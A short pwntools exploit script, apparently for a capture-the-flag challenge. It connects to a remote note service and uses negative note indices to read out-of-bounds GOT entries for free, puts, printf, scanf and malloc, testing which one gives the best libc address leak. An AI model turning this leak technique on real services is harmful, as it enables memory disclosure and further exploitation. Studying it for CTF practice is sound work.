#!/usr/bin/env python3
"""Find which GOT entry gives best leak"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.log_level = 'warn'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

create(0, 0x20, b'init')

# Test different GOT entries
got_entries = {
    -22: 'free@got',
    -21: 'puts@got',
    -18: 'printf@got',
    -16: 'scanf@got',
    -14: 'malloc@got',
}

for idx, name in got_entries.items():
    try:
        data = view(idx)
        print(f"{name:15} ({idx:3}): len={len(data):3} data={data[:30]}")
    except:
        print(f"{name:15} ({idx:3}): FAILED")

io.close()
